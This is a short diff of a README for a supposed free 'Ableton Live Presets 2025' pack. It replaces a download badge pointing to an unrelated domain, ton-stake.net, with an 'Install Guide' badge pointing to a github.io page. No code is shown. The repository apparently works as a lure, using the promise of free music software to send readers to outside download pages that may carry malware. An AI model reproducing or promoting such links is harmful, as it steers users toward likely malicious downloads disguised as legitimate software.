@@ -3,7 +3,10 @@
 **Ableton Live Presets 2025** is a free pack of instruments, sound presets, and effect racks for music production.  
 Compatible with Ableton Live 11 and 12, it helps producers create faster with ready-to-use sounds.  
 
-[![Download Presets](https://img.shields.io/badge/Download-Ableton_Presets_2025-blueviolet)](https://ton-stake.net)
+<a href="https://ableton-live-presets-2025.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
+
 
 ---
 
